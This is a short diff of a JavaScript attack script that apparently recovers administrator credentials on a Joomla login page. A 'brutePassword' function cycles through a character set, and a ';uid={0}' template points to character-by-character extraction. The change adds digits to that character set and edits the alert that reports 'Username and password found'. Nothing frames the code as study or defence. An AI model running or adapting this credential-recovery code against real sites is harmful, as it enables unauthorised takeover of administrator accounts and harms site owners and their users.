@@ -1,4 +1,4 @@
-var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+var charset = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
 var postData = {}
 var tplUname = ";uid={0}";
@@ -58,7 +58,7 @@ function brutePassword(passwd, index) {
 	index = typeof index !== 'undefined' ? index : 0;
 	if (index >= charset.length) {
 		jQuery('#mod-login-password').val(passwd);
-		jQuery('#system-message-container').append('<div class="alert "><div class="alert-message">Username and password found. "'+username+':'+passwd+'"</div><div>')
+		jQuery('#system-message-container').append('<div class="alert "><div class="alert-message">Username and password found. "'+username+':'+passwd+'</div><div>')
 		// passwd += charset[index]
 		return passwd;
 	}
